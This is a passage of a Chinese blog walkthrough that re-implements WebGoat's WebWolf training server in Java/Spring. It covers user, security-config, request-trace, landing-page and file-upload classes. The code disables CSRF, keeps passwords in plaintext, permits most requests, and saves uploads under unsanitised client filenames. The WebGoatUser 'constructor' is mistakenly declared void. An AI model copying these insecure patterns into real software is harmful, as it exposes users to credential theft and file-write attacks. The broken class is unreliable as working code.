<h3 id="WebGoatUser-1"><a href="#WebGoatUser-1" class="headerlink" title="WebGoatUser"></a>WebGoatUser</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.webwolf.user;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.GrantedAuthority;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.User;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetails;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.Entity;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Id;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Transient;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebGoatUser</span> <span class="keyword">implements</span> <span class="title class_">UserDetails</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="meta">@Transient</span></span><br><span class="line">    <span class="keyword">private</span> User user;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">WebGoatUser</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">WebGoatUser</span><span class="params">(String username,String password)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">        createUser();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createUser</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.user = <span class="keyword">new</span> <span class="title class_">User</span>(username,password,getAuthorities());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Collection&lt;? <span class="keyword">extends</span> <span class="title class_">GrantedAuthority</span>&gt; getAuthorities()&#123;<span class="keyword">return</span> Collections.emptyList();&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAccountNonExpired</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.user.isAccountNonExpired();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAccountNonLocked</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.user.isAccountNonLocked();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCredentialsNonExpired</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.user.isCredentialsNonExpired();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEnabled</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.user.isEnabled();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="WebSecurityConfig-1"><a href="#WebSecurityConfig-1" class="headerlink" title="WebSecurityConfig"></a>WebSecurityConfig</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.webwolf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.webwolf.user.UserService;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.authentication.AuthenticationManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.builders.HttpSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.configurers.ExpressionUrlAuthorizationConfigurer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetailsService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.crypto.password.NoOpPasswordEncoder;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">//告诉spring 这是一个配置类</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="comment">//作用于类,生成一个参数为所有实例变量的构造方法</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="comment">//用于在项目中启用springsecurity 开启安全认证</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSecurityConfig</span> <span class="keyword">extends</span> <span class="title class_">WebSecurityConfigurerAdapter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserService userDetailsService;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        ExpressionUrlAuthorizationConfigurer&lt;HttpSecurity&gt;.<span class="type">ExpressionInterceptUrlRegistry</span> <span class="variable">security</span> <span class="operator">=</span> http</span><br><span class="line">                .authorizeRequests()</span><br><span class="line">                <span class="comment">//                开启登录匹配</span></span><br><span class="line">                .antMatchers(<span class="string">&quot;/css/**&quot;</span>,<span class="string">&quot;/images/**&quot;</span>,<span class="string">&quot;/js/**&quot;</span>,<span class="string">&quot;/fonts/**&quot;</span>,<span class="string">&quot;/webjars/**&quot;</span>,<span class="string">&quot;/home&quot;</span>).permitAll()</span><br><span class="line"><span class="comment">//                允许匿名的url 可以理解为放行接口 多个接口使用,分割</span></span><br><span class="line">                .antMatchers(HttpMethod.GET,<span class="string">&quot;/mail/**&quot;</span>,<span class="string">&quot;/requests/**&quot;</span>).authenticated()</span><br><span class="line"><span class="comment">//                这些get请求需要登录才能访问</span></span><br><span class="line">                .antMatchers(<span class="string">&quot;/files&quot;</span>).authenticated()</span><br><span class="line"><span class="comment">//                这些请求需要登录才能访问</span></span><br><span class="line">                .anyRequest().permitAll();</span><br><span class="line"><span class="comment">//              剩余请求可随意访问</span></span><br><span class="line">        security.and()</span><br><span class="line"><span class="comment">//                进行拼接</span></span><br><span class="line">                .csrf().disable()</span><br><span class="line"><span class="comment">//              关闭csrf跨域</span></span><br><span class="line">                .formLogin().loginPage(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"><span class="comment">//                设置登录页面</span></span><br><span class="line">                .failureForwardUrl(<span class="string">&quot;/login?error=true&quot;</span>);</span><br><span class="line"><span class="comment">//                设置登录失败页面</span></span><br><span class="line"></span><br><span class="line">        security.and()</span><br><span class="line">                .formLogin().loginPage(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"><span class="comment">//                设置表单登录页面</span></span><br><span class="line">                .defaultSuccessUrl(<span class="string">&quot;/home&quot;</span>,<span class="literal">true</span>)</span><br><span class="line">                .permitAll();</span><br><span class="line">        security.and()</span><br><span class="line">                .logout()</span><br><span class="line">                .permitAll();</span><br><span class="line"><span class="comment">//        注销操作</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureGlobal</span><span class="params">(AuthenticationManagerBuilder auth)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        auth.userDetailsService(userDetailsService);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    将用户设置在内存中</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> UserDetailsService <span class="title function_">userDetailsServiceBean</span><span class="params">()</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="keyword">return</span>  userDetailsService;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> AuthenticationManager <span class="title function_">authenticationManager</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.authenticationManager();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> NoOpPasswordEncoder <span class="title function_">passwordEncoder</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (NoOpPasswordEncoder) NoOpPasswordEncoder.getInstance();</span><br><span class="line"><span class="comment">//        不对密码进行加密操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="MvcConfiguration-1"><a href="#MvcConfiguration-1" class="headerlink" title="MvcConfiguration"></a>MvcConfiguration</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.webwolf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.ResourceHandlerRegistration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.PostConstruct;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">//作为配置类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MvcConfiguration</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;webwolf.fileserver.location&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String fileLocation;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span>&#123;</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/files/**&quot;</span>).addResourceLocations(<span class="string">&quot;file:///&quot;</span>+fileLocation+<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="comment">//        意思就是前段浏览器访问路径带有/file/**就转到对应磁盘下读取图片</span></span><br><span class="line"><span class="comment">//        类似于前端访问tomcat webapp下file文件夹中文件</span></span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/css/**&quot;</span>).addResourceLocations(<span class="string">&quot;classpath:/webwolf/static/css/&quot;</span>);</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/js/**&quot;</span>).addResourceLocations(<span class="string">&quot;classpath:/webwolf/static/js/&quot;</span>);</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/images/**&quot;</span>).addResourceLocations(<span class="string">&quot;classpath:/webwolf/static/images/&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    当在springboot创建容器时执行</span></span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createDirectory</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileLocation);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists())&#123;</span><br><span class="line">            file.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="requests-1"><a href="#requests-1" class="headerlink" title="requests"></a>requests</h2><h3 id="Requests"><a href="#Requests" class="headerlink" title="Requests"></a>Requests</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.webwolf.requests;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.RequiredArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.actuate.trace.http.HttpTrace;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.actuate.trace.http.HttpTrace.Request;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.context.SecurityContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetails;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.Instant;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.stream.Collectors.toList;</span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">// 该类代表控制类 控制层 响应层</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="comment">//写在类上可以代替@Autowired注解,需要注意的是在注入时需要用final定义,或者使用@notnull注解</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="comment">//日志</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/requests&quot;)</span></span><br><span class="line"><span class="comment">//对应请求的路径</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Requests</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WebWolfTraceRepository traceRepository;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ObjectMapper objectMapper;</span><br><span class="line">    <span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="comment">//    生成有参构造</span></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Tracert</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Instant date;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String path;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String json;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">get</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">model</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(<span class="string">&quot;requests&quot;</span>);</span><br><span class="line">        <span class="type">var</span> <span class="variable">user</span> <span class="operator">=</span> (UserDetails) SecurityContextHolder.getContext().getAuthentication().getPrincipal();</span><br><span class="line">        <span class="type">var</span> <span class="variable">traces</span> <span class="operator">=</span> traceRepository.findAllTraces().stream()</span><br><span class="line">                .filter(t -&gt; allowedTrace(t,user))</span><br><span class="line">                .map(t -&gt; <span class="keyword">new</span> <span class="title class_">Tracert</span>(t.getTimestamp(),path(t),toJsonString(t))).collect(toList());</span><br><span class="line">        model.addObject(<span class="string">&quot;traces&quot;</span>,traces);</span><br><span class="line">        <span class="keyword">return</span> model;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">allowedTrace</span><span class="params">(HttpTrace t, UserDetails user)</span>&#123;</span><br><span class="line">        <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> t.getRequest();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">allowed</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (req.getUri().getPath().contains(<span class="string">&quot;/files&quot;</span>) &amp;&amp; !req.getUri().getPath().contains(user.getUsername()))&#123;</span><br><span class="line">            allowed = <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.getUri().getPath().contains(<span class="string">&quot;/landing&quot;</span>) &amp;&amp; req.getUri().getPath()!=<span class="literal">null</span> &amp;&amp; req.getUri().getQuery().contains(<span class="string">&quot;uniqueCode&quot;</span>) &amp;&amp; !req.getUri().getQuery().contains(StringUtils.reverse(user.getUsername())))&#123;</span><br><span class="line">            allowed = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> allowed;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">path</span><span class="params">(HttpTrace t)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (String) t.getRequest().getUri().getPath();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">toJsonString</span><span class="params">(HttpTrace trace)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> objectMapper.writeValueAsString(trace);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (JsonProcessingException e)&#123;</span><br><span class="line">            log.error(<span class="string">&quot;Unable to create json&quot;</span>,e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No request(s) found&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="LandingPage"><a href="#LandingPage" class="headerlink" title="LandingPage"></a>LandingPage</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.webwolf.requests;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Callable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/landing/**&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LandingPage</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(method = &#123;RequestMethod.POST,RequestMethod.GET,RequestMethod.DELETE,RequestMethod.DELETE,RequestMethod.PATCH,RequestMethod.PUT&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> Callable&lt;ResponseEntity&lt;?&gt;&gt; ok(HttpServletRequest request)&#123;</span><br><span class="line">        <span class="keyword">return</span> ()-&gt;&#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Incoming request for: &#123;&#125;&quot;</span>,request.getRequestURI());</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.ok().build();</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="FileServer"><a href="#FileServer" class="headerlink" title="FileServer"></a>FileServer</h2><p>注意导入的WebGoatUser是那个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.webwolf;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.webwolf.user.WebGoatUser;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.context.SecurityContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.ModelMap;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.view.RedirectView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.ALL_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">//代表控制类 控制层响应层</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;webwolf.fileserver.location&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String fileLocation;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;server.address&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String server;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;server.port&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> port;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(path= &quot;/file-server-location&quot;,consumes = ALL_VALUE,produces = MediaType.TEXT_PLAIN_VALUE)</span></span><br><span class="line"><span class="comment">//   consumes 指定处理请求的提交内容类型(Content-Type) 例如application/json text/html</span></span><br><span class="line"><span class="comment">//    produces 指定返回的内容类型,仅当request请求头中Accept类型中包含该指定类型才返回</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFileLocation</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> fileLocation;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/fileupload&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">importFile</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span>MultipartFile myFile)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line"><span class="comment">//        MultipartFile 文件上传工具类</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">user</span> <span class="operator">=</span> (WebGoatUser) SecurityContextHolder.getContext().getAuthentication().getPrincipal();</span><br><span class="line"><span class="comment">//        用于获取当前对象</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">destinationDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileLocation,user.getUsername());</span><br><span class="line"><span class="comment">//        新建文件名和文件位置</span></span><br><span class="line">        destinationDir.mkdirs();</span><br><span class="line"><span class="comment">//        mkdirs可以创建多级目录</span></span><br><span class="line">        myFile.transferTo(<span class="keyword">new</span> <span class="title class_">File</span>(destinationDir,myFile.getOriginalFilename()));</span><br><span class="line">        log.debug(<span class="string">&quot;File save to &#123;&#125;&quot;</span>,<span class="keyword">new</span> <span class="title class_">File</span>(destinationDir,myFile.getOriginalFilename()));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">RedirectView</span>(<span class="string">&quot;files&quot;</span>,<span class="literal">true</span>),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ModelMap</span>().addAttribute(<span class="string">&quot;uploadSuccess&quot;</span>,<span class="string">&quot;File uploaded successful&quot;</span>)</span><br><span class="line"></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="comment">//    生成有参构造</span></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line"><span class="comment">//    生成get方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">UploadedFile</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String size;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> String link;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/files&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">getFiles</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">        <span class="type">WebGoatUser</span> <span class="variable">user</span> <span class="operator">=</span> (WebGoatUser) SecurityContextHolder.getContext().getAuthentication().getPrincipal();</span><br><span class="line"><span class="comment">//        获取当前用户</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> user.getUsername();</span><br><span class="line">        <span class="type">File</span> <span class="variable">destinationDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileLocation,username);</span><br><span class="line"></span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line"><span class="comment">//        新建视图层</span></span><br><span class="line">        modelAndView.setViewName(<span class="string">&quot;files&quot;</span>);</span><br><span class="line"><span class="comment">//        添加视图名称</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">changeIndicatorFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(destinationDir,user.getUsername()+<span class="string">&quot;_changed&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (changeIndicatorFile.exists())&#123;</span><br><span class="line"><span class="comment">//            如果文件已经存在的话 就添加请求上传成功</span></span><br><span class="line">            modelAndView.addObject(<span class="string">&quot;uploadSuccess&quot;</span>,request.getParameter(<span class="string">&quot;uploadSuccess&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        changeIndicatorFile.delete();</span><br><span class="line"><span class="comment">//        然后把文件删除</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">uploadedFiles</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        File[] files = destinationDir.listFiles(File::isFile);</span><br><span class="line">        <span class="keyword">if</span> (files != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (File file : files)&#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">size</span> <span class="operator">=</span> FileUtils.byteCountToDisplaySize(file.length());</span><br><span class="line">                <span class="type">String</span> <span class="variable">link</span> <span class="operator">=</span> String.format(<span class="string">&quot;files/%s/%s&quot;</span>,username,file.getName());</span><br><span class="line">                uploadedFiles.add(<span class="keyword">new</span> <span class="title class_">UploadedFile</span>(file.getName(),size,link));</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//            列出文件名并添加进去</span></span><br><span class="line">        &#125;</span><br><span class="line">        modelAndView.addObject(<span class="string">&quot;files&quot;</span>,uploadedFiles);</span><br><span class="line">        modelAndView.addObject(<span class="string">&quot;webwolf_url&quot;</span>,<span 